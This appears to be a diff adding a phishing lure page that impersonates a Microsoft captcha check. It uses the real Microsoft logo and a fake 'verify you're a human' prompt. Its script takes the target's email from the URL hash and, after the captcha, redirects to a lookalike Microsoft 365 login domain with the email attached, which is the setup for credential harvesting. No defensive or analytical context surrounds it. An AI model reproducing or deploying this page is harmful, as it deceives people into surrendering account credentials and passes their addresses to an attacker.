@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captcha Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f9f9f9;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .logo img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .message {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .captcha-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .captcha-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #333;
+            letter-spacing: 10px;
+            padding: 20px;
+            background-image: url('./image/img.png');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            border-radius: 50%;
+            border: 2px solid transparent;
+        }
+
+        .refresh-icon {
+            position: absolute;
+            right: 30px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: black;
+            font-size: 24px;
+        }
+
+        .input-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .captcha-input {
+            width: 100%;
+            max-width: 300px;
+            font-size: 16px;
+            border: none;
+            border-bottom: 2px solid black;
+            text-align: center;
+            outline: none;
+            padding: 5px 0;
+            margin-bottom: 20px;
+        }
+
+        .captcha-input:focus {
+            border-bottom: 2px solid #007bff;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+        }
+
+        .verify-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            gap: 10px;
+        }
+
+        .verify-button img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .verify-button.disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .feedback-message {
+            font-size: 16px;
+            margin-top: 20px;
+            color: #d9534f; /* Red for errors */
+        }
+
+        .feedback-message.success {
+            color: #5cb85c; /* Green for success */
+        }
+
+        @media (max-width: 768px) {
+            .logo img {
+                width: 120px;
+            }
+
+            .message {
+                font-size: 16px;
+            }
+
+            .verify-button {
+                font-size: 14px;
+                padding: 8px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+        </div>
+        <div class="message">To continue, Please verify you're a human</div>
+        <div class="captcha-section">
+            <div class="captcha-text" id="captchaText"></div>
+            <div class="refresh-icon" onclick="generateCaptcha()">&#x21bb;</div>
+        </div>
+        <div class="input-section">
+            <input type="text" id="captchaInput" class="captcha-input" placeholder="Enter Captcha">
+        </div>
+        <div class="button-container">
+            <button class="verify-button" id="verifyButton" onclick="verifyCaptcha()">
+                <img src="./image/download.png" alt="Verify Icon">
+                Verify
+            </button>
+        </div>
+        <div class="feedback-message" id="feedbackMessage"></div>
+    </div>
+
+    <script>
+        const captchaTextElement = document.getElementById('captchaText');
+        const captchaInput = document.getElementById('captchaInput');
+        const verifyButton = document.getElementById('verifyButton');
+        const feedbackMessage = document.getElementById('feedbackMessage');
+
+        let captchaText = '';
+
+        // Generate random captcha
+        function generateCaptcha() {
+            captchaText = '';
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            for (let i = 0; i < 6; i++) {
+                captchaText += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            captchaTextElement.textContent = captchaText;
+            feedbackMessage.textContent = ''; // Clear feedback message
+        }
+
+        // Parse email from hash
+        function getEmailFromHash() {
+            const hash = window.location.hash.substring(1); // Remove the # character
+            // Decode the email and return it
+            return decodeURIComponent(hash) || 'defaultuser@example.com';
+        }
+
+        // Validate CAPTCHA and redirect
+        function verifyCaptcha() {
+            const email = getEmailFromHash();
+
+            if (captchaInput.value === captchaText) {
+                feedbackMessage.textContent = 'Captcha Verified! Redirecting...';
+                feedbackMessage.className = 'feedback-message success';
+
+                const redirectUrl = `https://login-oncentificationnlcrosft365sharing491034.org/office-pad90148/MGJpvzy85WzyJt8IxKmLEY1yoTpEWQWxHXPGeZGdNlFMUPGpJ6CHSYuySffdjGuZLW8X8drI6F2GfIeNzeq0zuTPcmfbbyJL04Zd/?q=${encodeURIComponent(email)}`;
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1000);
+            } else {
+                feedbackMessage.textContent = 'Invalid Captcha. Please try again.';
+                feedbackMessage.className = 'feedback-message';
+                captchaInput.value = ''; // Clear input for retry
+            }
+        }
+
+        // Generate initial captcha on page load
+        generateCaptcha();
+    </script>
+</body>
+</html>  
+                           
